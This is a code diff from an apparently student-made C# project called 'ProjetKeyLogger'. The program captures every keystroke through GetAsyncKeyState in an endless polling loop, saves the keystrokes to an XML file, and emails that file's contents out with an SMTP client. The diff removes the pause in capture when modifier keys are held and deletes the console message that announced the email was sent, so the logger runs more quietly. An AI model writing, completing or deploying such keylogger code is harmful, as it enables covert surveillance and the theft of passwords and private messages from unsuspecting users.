@@ -35,7 +35,7 @@ namespace ProjetKeyLogger
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "../../../Fichier XML/TestXML.xml";
+            file_path = "TestXML.xml";
 
         }
 
@@ -57,27 +57,13 @@ namespace ProjetKeyLogger
             bool shift = false;
             bool ctrl = false;
             bool altgr = false;
+
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(5); //nombre en miliseconde
 
-                //booleen qui autorise ou non la saisie du clavier (On l'autorise pour l'instant)
-                Boolean autorise_saisie = true;
-
-                //liste des touches pour lesquelles la saisie est intérrompue
-                //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91};
-
-                //le tableau des touches d'interruptions de la capture est parcouru
-                for (int i = 0; i < list_non_accepte.Length; i++)
-                {
-                    //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
-                    int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
-                    if (statut_cle == 32769) { autorise_saisie = false; }
-                }
-                
                 //verification de l'état de chaque touche (up ou down)
                                 
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
@@ -382,7 +368,7 @@ namespace ProjetKeyLogger
             string Chemin_Txt = Chemin_Dossier + @"/TestXML.xml";
 
             //recuperation du contenu du fichier
-            string Contenu = File.ReadAllText(Chemin_Txt);
+            string Contenu = File.ReadAllText(file_path);
 
             //date du mail
             DateTime Date_Mail = DateTime.Now;
@@ -427,8 +413,6 @@ namespace ProjetKeyLogger
 
             //Envoie du message
             Client.Send(Message_Mail);
-
-            Console.WriteLine("Email envoyé");
         }
 
 
